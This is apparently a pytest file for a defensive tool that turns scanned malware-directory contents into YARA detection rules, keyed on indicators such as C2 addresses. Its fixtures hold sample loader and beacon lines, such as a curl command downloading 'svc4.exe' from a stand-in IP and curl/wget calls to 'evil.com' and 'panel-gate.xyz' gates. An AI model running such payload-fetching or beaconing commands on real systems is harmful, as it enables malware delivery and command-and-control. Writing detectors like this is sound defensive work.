"""Rules built from what a scan actually read, and honest about that.

The shape that matters: one rule per file, matching on the indicators that file
carries, with the digests kept in meta as identity rather than as the condition.
A hash matches one build; the address inside it survives the next one.
"""

from __future__ import annotations

import json

import pytest
import yara

from dirsift.models import Entry, Ioc, ScanResult
from dirsift.rules import build_rules

TARGET = "http://203.0.113.24/files/"


def loader() -> Entry:
    return Entry(
        url=TARGET + "install.bat",
        name="install.bat",
        depth=1,
        kind="script",
        fetched_bytes=120,
        sha256="a" * 64,
        md5="b" * 32,
        head_hex="4065",
        text_preview='curl -s -o "%TEMP%" http://203.0.113.24/bin/svc4.exe',
    )


def payload() -> Entry:
    return Entry(
        url=TARGET + "bin/svc4.exe",
        name="svc4.exe",
        depth=2,
        kind="pe",
        fetched_bytes=4096,
        truncated=True,
        head_hex="4d5a90000300000004000000",
        cluster="svc{n}.exe",
    )


def iocs_of_the_loader() -> list[Ioc]:
    return [
        Ioc(
            ioc_type="url",
            value="http://203.0.113.24/bin/svc4.exe",
            defanged="hxxp://203[.]0[.]113[.]24/bin/svc4[.]exe",
            source_url=TARGET + "install.bat",
        ),
        Ioc(
            ioc_type="ipv4",
            value="198.51.100.77",
            defanged="198[.]51[.]100[.]77",
            source_url=TARGET + "install.bat",
        ),
        Ioc(
            ioc_type="url",
            value="http://cdn.example.org/beacon",
            defanged="hxxp://cdn[.]example[.]org/beacon",
            source_url=TARGET + "other.txt",  # another file's indicator
        ),
    ]


def result_with(*entries: Entry, iocs: list[Ioc] | None = None) -> ScanResult:
    return ScanResult(root_url=TARGET, entries=list(entries), iocs=iocs or [])


def test_a_rule_matches_on_the_indicators_the_file_carries():
    rules = build_rules(
        result_with(loader(), iocs=iocs_of_the_loader()), [loader()], run_name="run"
    )
    assert '"http://203.0.113.24/bin/svc4.exe" ascii' in rules
    assert '"198.51.100.77" ascii' in rules
    assert "hash.sha256(0, filesize)" not in rules  # identity is meta, not the condition


def test_the_digests_stay_in_meta_as_identity():
    rules = build_rules(
        result_with(loader(), iocs=iocs_of_the_loader()), [loader()], run_name="run"
    )
    assert 'sha256 = "' + "a" * 64 + '"' in rules
    assert 'md5 = "' + "b" * 32 + '"' in rules


def test_only_the_indicators_of_that_file_are_used():
    rules = build_rules(
        result_with(loader(), iocs=iocs_of_the_loader()), [loader()], run_name="run"
    )
    assert "cdn.example.org" not in rules  # that one came out of another file


def test_each_file_gets_its_own_rule():
    both = [loader(), odd_binary()]
    rules = build_rules(result_with(*both, iocs=iocs_of_the_loader()), both, run_name="run")
    declarations = [line for line in rules.split(chr(10)) if line.startswith("rule ")]
    assert len(declarations) == 2
    assert "install_bat" in rules
    assert "stage_bin" in rules


def odd_binary() -> Entry:
    """A header nobody else uses, which is what makes it worth matching."""
    return Entry(
        url=TARGET + "bin/stage.bin",
        name="stage.bin",
        depth=2,
        kind="unknown",
        fetched_bytes=2048,
        truncated=True,
        head_hex="53544147453101020304",
    )


def test_a_file_with_no_indicators_falls_back_to_its_head_bytes():
    rules = build_rules(result_with(odd_binary()), [odd_binary()], run_name="run")
    assert "{ 53 54 41 47 45 31 01 02 03 04 }" in rules
    assert "at 0" in rules


def test_a_generic_executable_header_does_not_become_a_rule():
    """Matching on an MZ header alone would flag every Windows binary there is."""
    rules = build_rules(result_with(payload()), [payload()], run_name="run")
    declarations = [line for line in rules.split(chr(10)) if line.startswith("rule ")]
    assert declarations == []
    assert "svc4.exe" in rules  # it is named, with the reason
    assert "PE" in rules or "executable" in rules.lower()


def test_text_without_indicators_still_gives_strings():
    quiet = Entry(
        url=TARGET + "notes.txt",
        name="notes.txt",
        depth=1,
        kind="data",
        fetched_bytes=80,
        sha256="c" * 64,
        text_preview="staging box is behind the panel" + chr(10) + "rotate the loader weekly",
    )
    rules = build_rules(result_with(quiet), [quiet], run_name="run")
    assert '"staging box is behind the panel" ascii' in rules


def test_a_rule_carries_the_author_the_run_and_the_target():
    rules = build_rules(
        result_with(loader(), iocs=iocs_of_the_loader()), [loader()], run_name="20260916-demo"
    )
    assert 'author = "cyb3rp03t"' in rules
    assert "20260916-demo" in rules
    assert "hxxp://203[.]0[.]113[.]24/files/" in rules  # defanged, like everywhere else


def test_a_rule_says_it_came_from_a_bounded_read():
    rules = build_rules(result_with(payload()), [payload()], run_name="run")
    assert "partial" in rules.lower() or "head" in rules.lower()


def test_several_indicators_need_more_than_one_hit():
    """One address can appear anywhere; two of them together is a finding."""
    rules = build_rules(
        result_with(loader(), iocs=iocs_of_the_loader()), [loader()], run_name="run"
    )
    assert "any of them" in rules or "2 of them" in rules


def test_quotes_in_the_evidence_do_not_break_the_rule():
    entry = loader()
    rules = build_rules(result_with(entry), [entry], run_name="run")
    assert chr(92) + '"' in rules or '%TEMP%' not in rules


def test_the_rule_uses_the_form_the_file_actually_contains():
    """A note written with a defanged address is bytes; the rule must match those."""
    note = Entry(
        url=TARGET + "readme.txt",
        name="readme.txt",
        depth=1,
        kind="data",
        fetched_bytes=60,
        sha256="d" * 64,
        text_preview="panel is at hxxp://panel[.]example[.]net/admin",
    )
    indicator = Ioc(
        ioc_type="url",
        value="http://panel.example.net/admin",
        defanged="hxxp://panel[.]example[.]net/admin",
        source_url=TARGET + "readme.txt",
    )
    rules = build_rules(result_with(note, iocs=[indicator]), [note], run_name="run")
    assert '"hxxp://panel[.]example[.]net/admin" ascii' in rules
    assert '"http://panel.example.net/admin" ascii' not in rules


# An indicator two files carry


def test_an_indicator_shared_by_two_builds_goes_into_both_rules():
    """The second build carries the callback too, so its rule must match on it."""
    from dirsift.analyze import analyze
    from dirsift.asn import AsnTable

    def build(name: str, verb: str) -> Entry:
        return Entry(
            url=TARGET + name,
            name=name,
            depth=1,
            kind="script",
            fetched_bytes=60,
            text_preview=verb + " http://panel-gate.xyz/gate.php\n",
        )

    result = ScanResult(root_url=TARGET, entries=[build("a.bat", "curl"), build("b.bat", "wget")])
    result, _ = analyze(result, asn_table=AsnTable())
    rules = build_rules(result, [result.entries[1]], "run")
    assert '"http://panel-gate.xyz/gate.php" ascii' in rules


# Compiled and run against the file they came from


def compiled_on(result: ScanResult, entries: list[Entry]) -> tuple[str, dict[str, list[str]]]:
    """The rules, compiled by YARA, and which rules fire on each file's own bytes."""
    rules = build_rules(result, entries, "run")
    compiled = yara.compile(source=rules)
    fired = {
        entry.name: sorted(m.rule for m in compiled.match(data=entry.text_preview.encode("utf-8")))
        for entry in entries
    }
    return rules, fired


def rule_name(entry: Entry) -> str:
    return "dirsift_run_" + entry.name.replace(".", "_")


def text_file(name: str, text: str) -> Entry:
    return Entry(
        url=TARGET + name,
        name=name,
        depth=1,
        kind="script",
        fetched_bytes=len(text.encode("utf-8")),
        text_preview=text,
    )


def analysed(*entries: Entry) -> ScanResult:
    from dirsift.analyze import analyze
    from dirsift.asn import AsnTable

    result, _ = analyze(ScanResult(root_url=TARGET, entries=list(entries)), asn_table=AsnTable())
    return result


@pytest.mark.parametrize(
    "written",
    [
        "hxxps[:]//evil[.]com/gate",
        "evil(.)com",
        "evil{.}com",
        "evil dot com",
        "user[@]evil[.]com",
    ],
)
def test_a_defanged_form_goes_into_the_rule_as_written_and_fires(written):
    beacon = text_file("beacon.bat", f"rem panel\ncurl {written}\n")
    result = analysed(beacon)
    rules, fired = compiled_on(result, result.files)
    assert f'"{written}" ascii' in rules
    assert fired["beacon.bat"] == [rule_name(beacon)]


def test_one_address_in_three_builds_is_in_all_three_rules_and_each_fires():
    builds = [
        text_file(f"svc{n}.exe", f"connect 198.51.100.77:8443\nbuild {n}\n") for n in (4, 5, 6)
    ]
    result = analysed(*builds)
    rules, fired = compiled_on(result, result.files)
    for build in builds:
        block = rules.split("rule " + rule_name(build), 1)[1].split("\n}", 1)[0]
        assert '"198.51.100.77:8443" ascii' in block
        assert rule_name(build) in fired[build.name]


def test_each_file_carries_its_own_spelling_of_one_domain():
    live = text_file("live.bat", "curl http://cdn-gate.xyz/x\n")
    noted = text_file("notes.bat", "rem old panel cdn-gate[.]xyz\n")
    result = analysed(live, noted)
    rules, fired = compiled_on(result, result.files)
    live_block = rules.split("rule " + rule_name(live), 1)[1].split("\n}", 1)[0]
    noted_block = rules.split("rule " + rule_name(noted), 1)[1].split("\n}", 1)[0]
    assert '"cdn-gate.xyz" ascii' in live_block
    assert '"cdn-gate[.]xyz" ascii' in noted_block
    assert rule_name(live) in fired["live.bat"]
    assert rule_name(noted) in fired["notes.bat"]


def test_windows_line_endings_and_non_ascii_lines_still_fire():
    text = "@echo off\r\nREM сервер ödeme: hxxp://cdn-gate[.]xyz/p\r\ncurl cdn-gate(.)xyz\r\n"
    beacon = text_file("beacon.bat", text)
    result = analysed(beacon)
    rules, fired = compiled_on(result, result.files)
    assert '"hxxp://cdn-gate[.]xyz/p" ascii' in rules
    assert fired["beacon.bat"] == [rule_name(beacon)]


def test_an_old_run_without_sources_or_spellings_still_builds_rules(tmp_path):
    """The shape a run had before: only the first file, no spellings. It falls back."""
    note = text_file("notes.txt", "see hxxp://panel[.]example[.]net/gate for the panel\n")
    old = {
        "root_url": TARGET,
        "entries": [json.loads(note.model_dump_json())],
        "iocs": [
            {
                "ioc_type": "url",
                "value": "http://panel.example.net/gate",
                "defanged": "hxxp://panel[.]example[.]net/gate",
                "source_url": note.url,
            }
        ],
    }
    path = tmp_path / "old.json"
    path.write_text(json.dumps(old), encoding="utf-8")
    loaded = ScanResult.model_validate(json.loads(path.read_text(encoding="utf-8")))
    assert loaded.iocs[0].spellings == {} and loaded.iocs[0].sources == []
    rules, fired = compiled_on(loaded, loaded.files)
    assert '"hxxp://panel[.]example[.]net/gate" ascii' in rules
    assert fired["notes.txt"] == [rule_name(note)]
